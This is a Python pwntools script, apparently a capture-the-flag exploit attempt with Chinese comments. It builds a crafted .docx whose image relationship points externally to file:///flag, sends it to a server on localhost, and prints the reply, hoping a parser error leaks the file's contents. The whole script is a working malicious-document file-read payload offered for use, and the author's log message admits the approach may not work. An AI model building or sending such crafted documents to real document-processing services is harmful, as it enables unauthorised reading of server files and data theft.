#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import zipfile
import io

# --- 全局配置 ---
context.log_level = 'debug'

# 目标服务器配置 (请根据实际情况修改端口)
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 50941 # 请确认此端口是否正确

def create_leaky_image_docx():
    """
    创建一个尝试将 /flag 作为图片加载的 .docx 文件，
    希望能从服务器的报错信息中读取到 Flag。
    """
    zip_buffer = io.BytesIO()

    # 1. 主文档文件 (漏洞触发器)
    #    这里包含了一个 <w:drawing> 元素，它会渲染一张图片。
    #    这张图片通过 r:embed="rIdImage" 引用自关系文件。
    document_xml = f"""
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <w:document 
        xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" 
        xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
        <w:body>
            <w:p>
                <w:r>
                    <w:drawing>
                        <wp:inline xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
                            <wp:extent cx="333" cy="333"/>
                            <wp:docPr id="1" name="Picture 1"/>
                            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                                <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                                    <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                                        <pic:blipFill>
                                            <a:blip r:embed="rIdImage"/>
                                            <a:stretch><a:fillRect/></a:stretch>
                                        </pic:blipFill>
                                        <pic:spPr/>
                                    </pic:pic>
                                </a:graphicData>
                            </a:graphic>
                        </wp:inline>
                    </w:drawing>
                </w:r>
            </w:p>
        </w:body>
    </w:document>
    """.encode('utf-8')

    # 2. 关系文件 (攻击核心)
    #    定义一个图片(image)类型的外部关系，指向 file:///flag
    document_rels_xml = f"""
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
        <Relationship Id="rIdImage" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="file:///flag" TargetMode="External"/>
    </Relationships>
    """.encode('utf-8')
    
    # 3. 标准样板文件
    content_types_xml = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
    rels_xml = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'

    # --- 文件打包 ---
    with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
        zip_file.writestr('[Content_Types].xml', content_types_xml)
        zip_file.writestr('_rels/.rels', rels_xml)
        zip_file.writestr('word/_rels/document.xml.rels', document_rels_xml)
        zip_file.writestr('word/document.xml', document_xml)

    return zip_buffer.getvalue()

def exploit():
    log.info("Attempting attack via 'Leaky Error' from image parsing...")
    docx_payload = create_leaky_image_docx()
    log.info(f"Payload size: {len(docx_payload)} bytes")

    try:
        p = remote(TARGET_HOST, TARGET_PORT)
        p.send(docx_payload)
        p.shutdown('send')
        log.info("Receiving response...")
        response = p.recvall()
        
        if response:
            log.success("Server returned a response! This might contain a leaky error.")
            print("\n" + "="*50)
            print("          <<< Full Response from Server >>>")
            print("="*50)
            print(response.decode(errors='ignore'))
            print("="*50 + "\n")
        else:
            log.warning("Server closed connection without any response. This theory might also be incorrect.")
        p.close()

    except Exception as e:
        log.error(f"An error occurred: {e}")

if __name__ == "__main__":
    exploit()